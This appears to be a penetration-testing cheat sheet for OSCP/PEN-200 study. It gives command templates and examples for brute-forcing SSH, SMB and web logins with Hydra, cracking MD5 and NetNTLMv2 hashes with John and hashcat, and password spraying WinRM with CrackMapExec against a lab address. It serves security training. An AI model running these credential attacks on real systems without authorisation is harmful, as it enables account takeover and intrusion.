
---
Description :
     Hydra SSH against single user and password list

Parameters : #username #pass-file #target-ip

```cmd
hydra -l {{username}} -P {{pass-file}} {{target-ip}} ssh -t 4
```

```example
hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh -t 4
```

Tags :  #linux #hydra #ssh #oscp #pen-200

---

Description :
     Hydra SSH user list and single password

Parameters : #user-file #password #target-ip

```cmd
hydra -L {{user-file}} -p '{{password}}' {{target-ip}} ssh -t 4
```

```example
hydra -L users.txt -p 'Password1!' 10.10.10.10 ssh -t 4
```

Tags :  #linux #hydra #ssh #oscp #pen-200

---

Description :
     Hydra SMB

Parameters : #username #pass-file #target-ip

```cmd
hydra -l {{username}} -P {{pass-file}} {{target-ip}} smb -t 4
```

```example
hydra -l administrator -P /usr/share/wordlists/rockyou.txt 10.10.10.10 smb -t 4
```

Tags :  #linux #hydra #smb #oscp #pen-200

---

Description :
     Hydra web form POST (adjust path and failure string)

Parameters : #username #pass-file #url

```cmd
hydra -l {{username}} -P {{pass-file}} "{{url}}" http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -t 4
```

```example
hydra -l admin -P /usr/share/wordlists/rockyou.txt "10.10.10.10" http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid" -t 4
```

Tags :  #linux #hydra #web #oscp #pen-200

---

Description :
     John the Ripper crack hashes from file

Parameters : #file #pass-file

```cmd
john --wordlist={{pass-file}} {{file}}
```

```example
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

Tags :  #linux #john #hash #oscp #pen-200

---

Description :
     Hashcat MD5 mode example

Parameters : #hash #pass-file

```cmd
hashcat -m 0 {{hash}} {{pass-file}} --force
```

```example
hashcat -m 0 5f4dcc3b5aa765d61d8327deb882cf99 /usr/share/wordlists/rockyou.txt --force
```

Tags :  #linux #hashcat #hash #oscp #pen-200

---

Description :
     NetNTLMv2 hash file crack with hashcat

Parameters : #file #pass-file

```cmd
hashcat -m 5600 {{file}} {{pass-file}}
```

```example
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt
```

Tags :  #linux #hashcat #ntlm #oscp #pen-200

---

Description :
     CrackMapExec WinRM password spray small list

Parameters : #target-ip #user-file #pass-file

```cmd
crackmapexec winrm {{target-ip}} -u {{user-file}} -p {{pass-file}}
```

```example
crackmapexec winrm 10.10.10.10 -u users.txt -p passwords.txt
```

Tags :  #linux #crackmapexec #winrm #oscp #pen-200

---
